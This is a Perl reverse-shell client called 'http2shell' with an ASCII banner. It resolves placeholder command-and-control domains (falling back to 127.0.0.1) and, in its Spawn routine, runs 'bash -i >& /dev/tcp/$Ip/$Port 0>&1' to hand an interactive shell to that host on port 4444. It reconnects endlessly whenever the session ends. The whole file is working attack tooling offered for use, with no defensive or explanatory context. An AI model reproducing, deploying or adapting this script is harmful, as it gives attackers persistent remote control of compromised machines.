#!/usr/bin/perl
use strict;
use warnings;
use Socket;
use POSIX qw(setsid);

my $C2HttpsDomain   = "yourc2httpsdomain.com";
my $C2HttpDomain    = "yourc2httpdomain.com";
my $C2DefaultDomain = "127.0.0.1";
my $Port            = 4444;

my $Reset     = "\033[0m";
my $Red       = "\033[31m";
my $DarkGreen = "\033[38;5;22m";
my $Orange    = "\033[38;5;208m";
my $White     = "\033[37m";
my $Bold      = "\033[1m";
my $Dim       = "\033[2m";
my $Italic    = "\033[3m";

my $Banner = "
$Bold
${Orange}    __    __  __       ${Red} ___${Orange}        __         ____
${Orange}   / /_  / /_/ /_____ ${Red} |__ \\${Orange} _____/ /_  ___  / / /
${Orange}  / __ \\/ __/ __/ __ \\${Red} __/ /${Orange}/ ___/ __ \\/ _ \\/ / /
${Orange} / / / / /_/ /_/ /_/ /${Red}/___/${Orange}(__  ) / / /  __/ / /
${Orange}/_/ /_/\\__/\\__/ .___/${Red}/____/${Orange}____/_/ /_/\\___/_/_/
${Orange}             /_/
${Bold}${Red}  + ${Dim}${White}${Italic}http2shell${Reset}
${Bold}${Red}  + ${Dim}${White}${Italic}author: tom7${Reset}
${Bold}${Red}  + ${Dim}${White}${Italic}github: https://github.com/tom7voldemort${Reset}
${Bold}${Red}  + ${Dim}${White}${Italic}version: 1.2${Reset}
$Reset
";

sub TypeWrite {
    my ($Msg, $Delay) = @_;
    $Delay //= 0.01;
    for my $Ch (split //, $Msg) {
        print $Ch;
        select(undef, undef, undef, $Delay);
    }
    print "\n";
}

sub Info     { TypeWrite("${Bold}${Dim}${White}[${DarkGreen}info +${White}] $_[0]${Reset}") }
sub Warnings { TypeWrite("${Bold}${Dim}${White}[${Orange}warn !${White}] $_[0]${Reset}") }
sub Errors   { TypeWrite("${Bold}${Dim}${White}[${Red}error x${White}] $_[0]${Reset}") }

sub Resolve {
    for my $Domain ($C2HttpsDomain, $C2HttpDomain, $C2DefaultDomain) {
        my $Packed = gethostbyname($Domain);
        if ($Packed) {
            my $Ip = inet_ntoa($Packed);
            Info("resolved $Domain -> $Ip");
            return $Ip;
        }
    }
    return undef;
}

sub Spawn {
    my ($Ip, $Port) = @_;
    Info("spawning shell to $Ip:$Port");
    my $Ret = system("bash -c 'bash -i >& /dev/tcp/$Ip/$Port 0>&1'");
    return $Ret == 0;
}

sub Exploit {
    while (1) {
        eval {
            my $Ip = Resolve();
            if (!$Ip) {
                Errors("no server active. retrying...");
                sleep(3);
                return;
            }
            Info("target server: $Ip:$Port");
            Info("starting shell session...");
            my $Ok = Spawn($Ip, $Port);
            if ($Ok) {
                Info("shell session ended. reconnecting...");
            } else {
                Warnings("bad connection. retrying...");
            }
            select(undef, undef, undef, 0.5);
        };
        if ($@) {
            select(undef, undef, undef, 0.5);
        }
    }
}

system("clear");
print $Banner;
Exploit();
